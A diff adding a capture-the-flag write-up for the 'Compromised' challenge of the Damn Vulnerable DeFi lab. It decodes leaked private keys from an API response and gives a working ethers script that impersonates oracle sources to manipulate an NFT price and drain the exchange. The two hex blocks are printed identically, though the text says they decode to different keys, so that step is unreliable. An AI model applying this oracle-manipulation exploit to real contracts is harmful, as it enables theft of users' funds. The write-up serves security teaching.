@@ -249,3 +249,120 @@ If you look closer on how the level contracts are deployed, you will see that bo
 
 **Once you upload a photo, it will be always on the internet!**
 
+
+## 7) Compromised
+
+### Catch - Hints
+First go to the Damn Vulnerable DeFi website and enter this challenge page. You will see a response of an API. Try to do something with that...
+
+
+### Solution
+Essentially, we need somehow to change the NFT price by manipulating the oracle. What we need to do is quite straightforward once we figure out what's encoded API response data. If we look closer, we see that there are two lines of information. Supposing that each line is a single response, we have:
+
+    4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+    And the second set of information will be:
+
+    4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+If we convert each dataset into a text from hex, we get the following values:
+
+    MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+    MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+
+And afterwards, by decoding that string chain as a base64:
+    
+    0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+    0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+
+Hmmm, now they look familiar... They are indeed private keys! By running the following script we may determine their public key pair.
+
+        const privateKeys = ["0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"];
+        const publicKeys = privateKeys.map(hexValues =>{return ethers.utils.computeAddress(hexValues)});
+        console.log(" ");
+        console.log(`The leaked addresses are: ${publicKeys}`);
+        console.log(" ");
+        // Public Key 1: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
+        // Public Key 2: 0x81A5D6E50C214044bE44cA0CB057fe119097850c
+
+As we may see, those public keys are two out of the three "trusted" price sources of the oracle.
+The Oracle contract allows each trusted address to change the NFT price. So, why do we need two out of three sources? Why having just one is not enough?
+
+Looking closer how the oracle calculates the price, it gives the median price as a return when the price is queried. This median price is calculated as the price of the source that's on the "middle" of the price array. If there are even amount of sources, it calculates an average of the two middle prices.
+
+All of this won't be achievable if the prices are disordered. That's why before performing the ```_computedMedianPrice``` the prices are sorted. If we only change the price of the "middle" source, the contract sorts the prices in an ascending way and that price won't be taken into account. That's why we will need to change both source prices.
+
+By having access to the private keys, we are able to recover them and perform actions as if we where them. From now, everything is quite easy. The attacking process will be:
+
+1) Changing both source prices to an affordable price for the attacker, pretending to be each source wallet.
+2) Buy the NFT as the attacker.
+3) Get the current exchange balance (because our purchase increased it).
+4) Change the NFT price again like the step 1) but setting the price as the current exchange balance.
+5) Approve the Exchange for the recently minted NFT and then sell it.
+6) Set the NFT price back to its initial value.
+
+This process can be done with this script:
+
+        const privateKeys = ["0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"];
+        const publicKeys = privateKeys.map(hexValues =>{return ethers.utils.computeAddress(hexValues)});
+        console.log(" ");
+        console.log(`The leaked addresses are: ${publicKeys}`);
+        console.log(" ");
+        
+        // The following line creates the Wallet instances to connect them as signers.
+        let sourceWallets = privateKeys.map(keys => {return new ethers.Wallet(keys, ethers.provider)}) ;
+
+        // Helper function that loops over all the addresses making the calls to the Oracle contract.
+        const manipulatePrice = async (newPrice) => {
+            for (const wallet of sourceWallets){
+                let etherBalance = ethers.utils.formatEther(await ethers.provider.getBalance(wallet.address));
+                console.log(" ");
+                console.log("=======================================")
+                console.log(`Acting as wallet ${wallet.address}. It has a balance of ${etherBalance} ETH` );
+                console.log(`Changing DVNFT price to ${newPrice} ETH....`);
+                let parsedPrice = ethers.utils.parseEther(newPrice);
+                await this.oracle.connect(wallet).postPrice("DVNFT", parsedPrice);
+
+                expect(
+                    ethers.utils.formatEther(await this.oracle.getPriceBySource("DVNFT", wallet.address))
+                    ).to.equal(
+                        ethers.utils.formatEther(parsedPrice));
+                console.log("The price has been changed successfully.");
+                console.log(" ");
+            }
+            let oracleNFTPrice = ethers.utils.formatEther(await this.oracle.connect(attacker).getMedianPrice("DVNFT"));
+            console.log(`The computed price by the oracle is now ${oracleNFTPrice} ETH`);
+            console.log(" ");
+        }
+
+        let newPrice = "0.05"
+        await manipulatePrice(newPrice);
+        
+        // Minting One token.    
+        const gasEstimate = await this.exchange.estimateGas.buyOne({value: ethers.utils.parseEther("0.1")});
+        let mintedTokenID = await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther(newPrice), gasLimit: gasEstimate });
+        let attackerBalance = (await this.nftToken.balanceOf(attacker.address));
+        expect(attackerBalance).to.equal(1);
+        console.log(await this.nftToken.ownerOf(0))
+        console.log("=======================================");
+        console.log(`Successfully minted a token @ ${newPrice} ETH. The attacker now has ${attackerBalance} NFTs`);
+        console.log("=======================================");
+
+        // Getting the current exchange balance in order to drain it.
+        let currentExchangeBalance = ethers.utils.formatEther(await ethers.provider.getBalance(this.exchange.address));
+        console.log(`The exchange currently has a balance of ${currentExchangeBalance} ETH.`)
+        
+        // Setting up the price as the amount to drain.
+        await manipulatePrice(currentExchangeBalance);
+
+        // Starting the draining process.
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        // console.log(await this.nftToken.ownerOf(0)); // ===> Check that the first token has 0 as index.
+        await this.exchange.connect(attacker).sellOne(0);
+
+        // Placing the NFT price back to its older price.
+        await manipulatePrice("999");
+
+### Learnings - Mitigations
+- The main vulnerability in here is the Web2-side of the project. While using sensible data, it is advised to use one way encoded formats of that data in order to prevent this scenarios.
+- Knowing how and what information is available to be queried from our server also helps.
